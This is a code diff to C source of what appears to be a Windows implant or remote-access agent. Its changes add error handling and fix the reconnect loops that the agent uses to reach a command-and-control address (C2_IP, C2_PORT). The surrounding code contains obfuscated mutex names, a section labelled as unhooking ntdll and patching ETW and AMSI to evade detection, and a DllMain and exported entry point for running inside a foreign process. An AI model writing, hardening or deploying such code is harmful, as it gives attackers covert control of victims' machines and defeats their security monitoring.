@@ -40,7 +40,11 @@ static void resolve_key_path(void)
 {
     /* Start from the EXE's own full path */
     char exePath[MAX_PATH] = {0};
-    GetModuleFileNameA(NULL, exePath, sizeof(exePath) - 1);
+    DWORD pathLen = GetModuleFileNameA(NULL, exePath, sizeof(exePath) - 1);
+    if (pathLen == 0) {
+        strncpy(g_key_path, SECRET_KEY_PATH, sizeof(g_key_path) - 1);
+        return;
+    }
 
     /* Strip the filename to get just the directory */
     char *last = strrchr(exePath, '\\');
@@ -250,6 +254,7 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev,
      * runtime — the custom name will be visible in the binary but is short-lived
      * on the stack.  The default path (no override) is fully obfuscated.
      */
+    HANDLE hMutex = NULL;
     {
         char mutexName[128] = {0};
 #if MUTEX_NAME_LEN > 0
@@ -269,9 +274,10 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev,
             mutexName[_i] = rawMutex[_i];
         mutexName[mLen] = '\0';
 #endif
-        CreateMutexA(NULL, FALSE, mutexName);
+        hMutex = CreateMutexA(NULL, FALSE, mutexName);
         SecureZeroMemory(mutexName, sizeof(mutexName));
     }
+    if (hMutex == NULL && GetLastError() != ERROR_ALREADY_EXISTS) return 0xEEB15;
     if (GetLastError() == ERROR_ALREADY_EXISTS) return 0;
 
     /* ── 1a. Evasion: unhook ntdll, patch ETW + AMSI ─────────────────── */
@@ -367,7 +373,9 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev,
 
         /* Retry TCP connect; recreate socket on each failure to avoid
          * using a socket that may have been put into an error state.   */
-        while (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
+        for (;;) {
+            if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == 0)
+                break;
             DBG_LOG(DBG_SS_NET, DBG_WARN,
                     "connect(%s:%d) failed (WSAErr=%d) — retrying", C2_IP, C2_PORT, WSAGetLastError());
             closesocket(sock);
@@ -376,12 +384,8 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev,
             if (sock == INVALID_SOCKET) {
                 DBG_LOG(DBG_SS_NET, DBG_WARN, "socket() failed after connect retry — will retry again");
                 jitter_sleep(RECONNECT_DELAY_SEC * 1000);
+                continue;  /* loop back to socket() — never connect/closesocket on INVALID_SOCKET */
             }
-        }
-
-        if (sock == INVALID_SOCKET) {
-            jitter_sleep(RECONNECT_DELAY_SEC * 1000);
-            continue;
         }
         DBG_LOG(DBG_SS_NET, DBG_OK, "TCP connected to %s:%d", C2_IP, C2_PORT);
 
@@ -466,8 +470,10 @@ __declspec(dllexport) void AgentRun(void)
         (LPCSTR)&AgentRun, &hSelf);
 
     char modPath[MAX_PATH] = {0};
-    if (hSelf)
-        GetModuleFileNameA(hSelf, modPath, sizeof(modPath) - 1);
+    if (hSelf) {
+        DWORD modLen = GetModuleFileNameA(hSelf, modPath, sizeof(modPath) - 1);
+        if (modLen == 0) hSelf = NULL;  /* treat as unresolved on failure */
+    }
 
     char *last = strrchr(modPath, '\\');
     if (last) {
@@ -544,7 +550,9 @@ static DWORD WINAPI _agent_thread(LPVOID lpParam)
         }
         DBG_LOG(DBG_SS_NET, DBG_INFO, "_agent_thread: connecting to %s:%d", C2_IP, C2_PORT);
 
-        while (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
+        for (;;) {
+            if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == 0)
+                break;
             DBG_LOG(DBG_SS_NET, DBG_WARN,
                     "_agent_thread: connect(%s:%d) failed (WSAErr=%d) — retrying",
                     C2_IP, C2_PORT, WSAGetLastError());
@@ -554,9 +562,9 @@ static DWORD WINAPI _agent_thread(LPVOID lpParam)
             if (sock == INVALID_SOCKET) {
                 DBG_LOG(DBG_SS_NET, DBG_WARN, "_agent_thread: socket() failed after retry");
                 jitter_sleep(RECONNECT_DELAY_SEC * 1000);
+                continue;  /* loop back to socket() — never connect/closesocket on INVALID_SOCKET */
             }
         }
-        if (sock == INVALID_SOCKET) { jitter_sleep(RECONNECT_DELAY_SEC * 1000); continue; }
         DBG_LOG(DBG_SS_NET, DBG_OK, "_agent_thread: TCP connected to %s:%d", C2_IP, C2_PORT);
 
         /* SO_RCVTIMEO + SO_KEEPALIVE */
@@ -618,7 +626,11 @@ BOOL WINAPI DllMain(HINSTANCE hModule, DWORD dwReason, LPVOID lpReserved)
          * GetModuleFileNameA(hModule) returns the path of our loaded .exe file
          * even when it is loaded as a DLL inside a foreign process.           */
         char modPath[MAX_PATH] = {0};
-        GetModuleFileNameA(hModule, modPath, sizeof(modPath) - 1);
+        DWORD modLen = GetModuleFileNameA(hModule, modPath, sizeof(modPath) - 1);
+        if (modLen == 0) {
+            strncpy(g_key_path, SECRET_KEY_PATH, sizeof(g_key_path) - 1);
+            return TRUE;
+        }
         char *last = strrchr(modPath, '\\');
         if (last) {
             *(last + 1) = '\0';
